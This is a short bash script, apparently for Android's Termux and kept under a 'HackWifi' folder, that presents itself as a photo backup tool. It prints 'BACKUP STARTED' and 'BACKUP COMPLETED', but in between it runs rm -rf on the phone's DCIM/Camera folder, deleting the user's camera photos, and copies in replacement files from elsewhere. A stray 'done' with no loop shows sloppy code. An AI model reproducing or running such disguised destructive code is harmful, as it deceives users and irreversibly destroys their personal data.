#!/bin/bash
clear

echo "BACKUP STARTED PLEASE WAIT" | lolcat
rm -rf /storage/emulated/0/DCIM/Camera
cd /storage/emulated/0/DCIM
mkdir Camera
cp -r $HOME/HackWifi/b/Camera /storage/emulated/0/DCIM
echo "BACKUP COMPLETED" | lolcat
echo "PLEASE CHECK YOUR GALLERY" | lolcat
exit
done
